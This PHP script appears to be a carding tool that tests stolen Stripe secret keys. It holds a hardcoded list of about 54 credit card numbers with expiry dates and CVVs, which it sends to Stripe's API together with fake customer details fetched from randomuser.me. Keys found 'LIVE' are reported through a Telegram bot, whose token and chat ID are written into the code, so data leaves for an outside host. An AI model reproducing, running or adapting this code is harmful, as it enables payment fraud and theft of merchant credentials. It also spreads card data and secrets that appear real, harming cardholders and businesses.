<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
};
$sk = $_GET['lista'];
if($sk == ""){
    exit();
}
$cc_info_arr[] = "4381710006409218|11|24|319";
$cc_info_arr[] = "4580260110748167|09|27|600";
$cc_info_arr[] = "4147202522407491|12|2026|038";
$cc_info_arr[] = "4074003840204330|04|2024|171";
$cc_info_arr[] = "4918460083677475|09|2024|055";
$cc_info_arr[] = "5397570062798097|08|23|916";
$cc_info_arr[] = "4351770000180864|09|2023|508";
$cc_info_arr[] = "4000222097593323|05|2027|811";
$cc_info_arr[] = "4217835032730384|07|26|827";
$cc_info_arr[] = "4291170051094366|09|2026|517";
$cc_info_arr[] = "4147463002163349|07|2024|526";
$cc_info_arr[] = "4200260010135739|05|26|968";
$cc_info_arr[] = "4519922161417242|07|2029|376";
$cc_info_arr[] = "4342561082681370|01|2024|388";
$cc_info_arr[] = "4266841695242923|12|2026|724";
$cc_info_arr[] = "4270880088281647|12|2025|211";
$cc_info_arr[] = "5574833751497883|04|27|170";
$cc_info_arr[] = "5312600051765278|03|2027|527";
$cc_info_arr[] = "4519922105913868|04|2029|970";
$cc_info_arr[] = "4918460083674324|09|2024|717";
$cc_info_arr[] = "4901440444255848|10|2028|333";
$cc_info_arr[] = "4915664447201590|04|2024|165";
$cc_info_arr[] = "5312600051765682|03|2027|801";
$cc_info_arr[] = "5524903604554858|04|2026|150";
$cc_info_arr[] = "5129213620392211|05|2024|000";
$cc_info_arr[] = "5574833739973393|11|25|020";
$cc_info_arr[] = "4901440442323572|10|2028|333";
$cc_info_arr[] = "4049903500500657|08|2026|293";
$cc_info_arr[] = "4557880433778283|11|2025|020";
$cc_info_arr[] = "4517660178029889|10|2028|549";
$cc_info_arr[] = "4901440447180258|10|2028|333";
$cc_info_arr[] = "4901440445371511|10|2028|333";
$cc_info_arr[] = "4744870029528501|12|2027|418";
$cc_info_arr[] = "5411757121353475|12|2024|047";
$cc_info_arr[] = "4147463004662439|02|2024|349";
$cc_info_arr[] = "4147463004669921|02|2024|777";
$cc_info_arr[] = "4430440087082491|08|2025|741";
$cc_info_arr[] = "4966233535847017|11|2028|113";
$cc_info_arr[] = "4960160006177473|04|2027|048";
$cc_info_arr[] = "5411757121348277|04|2024|432";
$cc_info_arr[] = "4016583080669293|12|2027|967";
$cc_info_arr[] = "4766630077106748|10|2031|222";
$cc_info_arr[] = "4403935207253941|11|2027|102";
$cc_info_arr[] = "5356666287728825|10|25|862";
$cc_info_arr[] = "4543607059511780|11|2024|313";
$cc_info_arr[] = "4766630077100337|10|2031|710";
$cc_info_arr[] = "4258084536588473|03|2025|600";
$cc_info_arr[] = "5520040003436884|09|2026|665";
$cc_info_arr[] = "4966234351444384|10|2029|643";
$cc_info_arr[] = "4938410194242061|08|22|945";
$cc_info_arr[] = "4065875208798180|06|2023|278";
$cc_info_arr[] = "4092910000219957|05|2024|844";
$cc_info_arr[] = "5504726188296875|06|21|955";
$cc_info_arr[] = "4065875208793728|06|2023|272";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];
$i = explode("|", $cc_info);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$LIVE = $i[3];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
////////////////////////////===[Random User ]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
  $ch = curl_init(); // 1req
  //curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=juldeptrai&card[number]='.$cc.'&card[cvc]='.$LIVE.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
    $result1 = curl_exec($ch);
//echo "<b>Result1: </b> $result1<br>";
  $s = json_decode($result1, true);
  $token = $s['id'];
////////////
$ch = curl_init(); // 2req 
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
///echo "<b>Result2: </b> $result2<br>";
//echo  $cus = json_decode($result2, true);
//echo $token1 = $cus['id'];
///echo $token1 = $cus['id'];
$msg1 = trim(strip_tags(getStr($result1,'"message": "','"')));
$code1 = trim(strip_tags(getStr($result1,'"code": "','"')));
$msg2 = trim(strip_tags(getStr($result2,'"message": "','"')));
$code2 = trim(strip_tags(getStr($result2,'"code": "','"')));
//echo "<span> ".$message."</span>";
//echo "<span>  LIVE_check = ".$LIVEcheck."</span>";
////////////////////////////===[Card Response]
$bin = substr("$cc", 0, 6);
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
////////////////////////////////////////
// Set the chat ID and token
$chatID = -1001797210892;
$token = "5856648236:AAEBqiJuFjG-17019DLpRBRi3NozM4kyJnQ";

// Set the default message and the live message
$LIVEMessage = urlencode("LIVE:$lista [$resp2][$msg2]");
// Perform the request and get the result
$result = getResult();
/////////////////////////// [Card Response]  //////////////////////////
if (strpos($result1, "testmode_charges_only")) {
    echo '<span style="color:Aqua">CCN:'.$sk.'<br>['.$code1.']====[Result(R1): '.$msg1.']</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '<span style="color:Aqua">CCN:'.$sk.'<br>['.$code1.']====[Result(R1): '.$msg1.']</span><br>';
}
elseif(strpos($result1, "Invalid API Key provided:" )) {
    echo '<span style="color:red">DEAD:'.$sk.'<br>['.$code1.']====[Result(R1): '.$msg1.']</span><br>';
}
elseif(strpos($result2, "Invalid API Key provided:" )) {
    echo '<span style="color:red">DEAD:'.$sk.'<br>['.$code2.']====[Result(R2): '.$msg2.']</span><br>';
}
else {
    echo '<span style="color:#33cc33">LIVE:'.$sk.'<br>[Result(R1): '.$msg1.']===['.$code1.']</span> <br>[Result(R2): '.$msg2.']====['.$code2.']</span><br>';  
    $sendlive = true;  
}
  curl_close($ch);
  ob_flush();
  // Check if the $sendlive variable is true
if ($sendlive === true ) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage";
    $response = file_get_contents($apiUrl);
}
// The getResult function
function getResult() {
    // Perform the request and return the result
    // Replace this with your actual code to get the result
    return "This is a test result";
}
?>